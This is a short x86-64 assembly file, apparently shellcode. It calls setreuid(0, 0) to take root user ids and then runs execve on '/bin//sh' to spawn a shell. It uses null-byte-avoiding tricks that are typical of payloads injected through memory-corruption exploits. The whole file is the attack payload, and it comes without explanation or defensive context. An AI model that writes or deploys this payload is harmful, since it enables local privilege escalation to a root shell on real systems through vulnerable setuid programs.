[SECTION .text]

global _start

_start:

	;setreuid(0, 0)
	xor rax, rax
	mov al, 113	
	xor rdi, rdi
	xor rsi, rsi

	syscall


	;execve("/bin//sh", NULL, NULL)
	xor rax, rax

	mov rsi, rax 
	mov rdx, rax 
	mov rbx, '/bin//sh'

	push rax
	push rbx

	mov rdi, rsp

	mov rax, 59
	syscall

	ret
